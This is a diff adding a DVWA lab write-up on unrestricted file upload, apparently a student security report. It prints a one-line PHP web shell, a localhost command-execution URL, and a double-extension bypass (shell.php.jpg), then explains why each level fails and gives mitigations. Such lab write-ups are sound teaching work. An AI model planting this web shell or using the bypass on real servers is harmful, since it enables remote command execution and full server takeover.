@@ -455,3 +455,160 @@ Implementing CSRF tokens, proper request validation, and secure session manageme
 
 ---
 
+# File Upload
+
+## Vulnerability Overview
+
+Unrestricted file upload vulnerabilities occur when an application allows users to upload files without proper validation or restrictions.
+
+Attackers can upload malicious files such as web shells and execute arbitrary commands on the server. This can lead to complete server compromise.
+
+In DVWA, the file upload functionality is intended to allow image uploads. However, improper validation allows attackers to upload executable PHP files.
+
+---
+
+# Security Level: LOW
+
+## Payload Used
+
+Malicious file:
+
+```
+shell.php
+```
+
+Contents of the file:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+## Result
+
+The PHP file was successfully uploaded to the server.
+
+Upload confirmation message:
+
+```
+../../../hackable/uploads/shell.php successfully uploaded!
+```
+
+The uploaded shell allowed execution of system commands through the browser.
+
+Example command executed:
+
+```
+http://localhost:8080/hackable/uploads/shell.php?cmd=whoami
+```
+
+Example result:
+
+```
+www-data
+```
+
+## Screenshot
+
+![File Upload Low](FileUploadLow.png)
+
+## Explanation (Why the Attack Works)
+
+At the Low security level, the application does not perform any validation on uploaded files.
+
+Because of this, attackers can upload executable PHP files which can then be accessed through the browser.
+
+This allows attackers to run system commands on the server and potentially gain full control of the system.
+
+---
+
+# Security Level: MEDIUM
+
+## Payload Used
+
+```
+shell.php.jpg
+```
+
+## Result
+
+The file upload bypassed the weak file extension validation.
+
+The application attempted to block `.php` files, but it was still possible to upload a malicious file using a double extension.
+
+## Screenshot
+
+![File Upload Medium](FileUploadMedium.png)
+
+## Explanation
+
+At the Medium security level, DVWA introduces basic validation by checking the file extension.
+
+However, the validation is weak and can be bypassed by renaming the file using a double extension such as `.php.jpg`.
+
+Because the server still interprets the file as PHP in certain cases, attackers may still execute malicious code.
+
+This demonstrates improper file validation.
+
+---
+
+# Security Level: HIGH
+
+## Payload Used
+
+```
+shell.php
+```
+
+## Result
+
+The upload attempt was blocked by the application.
+
+The system prevented the malicious PHP file from being uploaded.
+
+## Screenshot
+
+![File Upload High](FileUploadHigh.png)
+
+## Explanation
+
+At the High security level, DVWA performs stronger validation on uploaded files.
+
+The application checks both the file extension and the file type to ensure that only legitimate image files are accepted.
+
+This prevents attackers from uploading executable PHP scripts.
+
+---
+
+# Security Level Comparison
+
+| Security Level | Payload | Result |
+|----------------|--------|--------|
+| Low | `shell.php` | Malicious file uploaded and executed |
+| Medium | `shell.php.jpg` | Validation bypassed |
+| High | `shell.php` | Upload blocked |
+
+---
+
+# OWASP Top 10 Mapping
+
+This vulnerability relates to:
+
+**OWASP Top 10 – A05: Security Misconfiguration**
+
+Improper file upload validation can allow attackers to upload malicious scripts and gain control of the server.
+
+---
+
+# Security Impact
+
+If exploited in real-world applications, attackers could:
+
+- Upload malicious scripts
+- Execute system commands
+- Install backdoors
+- Access sensitive files
+- Take full control of the server
+
+Proper file validation, MIME type checking, and restricting executable uploads are essential security practices to prevent this vulnerability.
+
+---
